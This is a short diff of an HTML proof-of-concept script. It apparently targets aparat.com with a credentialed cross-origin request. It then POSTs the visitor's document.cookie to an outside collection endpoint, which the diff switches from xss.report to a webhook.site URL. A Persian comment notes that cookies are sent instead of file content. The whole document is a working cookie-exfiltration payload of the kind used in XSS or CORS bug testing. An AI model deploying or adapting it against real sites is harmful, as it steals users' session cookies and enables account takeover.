@@ -3,11 +3,11 @@
 <body>
 <script>
     var req = new XMLHttpRequest();
-    req.open('GET', 'https://www.aparat.com/redesign/static/vendor/surtur-web-sdk-1.8.6.js', true);
+    req.open('GET', 'https://www.aparat.com/assets/web/player/romeo/AparatRomeoJS.php', true);
     req.withCredentials = true;
     req.onload = function() {
         var logReq = new XMLHttpRequest();
-        logReq.open('POST', 'https://xss.report/c/ashkan', true);
+        logReq.open('POST', 'https://webhook.site/1512def5-c717-41c1-acf1-baf3a8864967', true);
         logReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
         logReq.send('cookies=' + encodeURIComponent(document.cookie));  // ارسال کوکی‌ها به جای محتوای فایل
     };
